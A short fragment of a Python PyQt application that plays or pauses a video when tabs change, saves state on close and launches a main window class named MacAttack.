                if not self.videoPlayer.is_playing():  # Check if the video is not already playing
                    self.videoPlayer.play()  # Play the video
            else:  # When any tab other than Tab 1 is selected
                if self.videoPlayer.is_playing():  # Check if the video is currently playing
                    self.videoPlayer.pause()  # Pause the video

    def closeEvent(self, event):
        self.SaveTheDay()
        self.GiveUp()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MacAttack()
    window.show()
    sys.exit(app.exec_())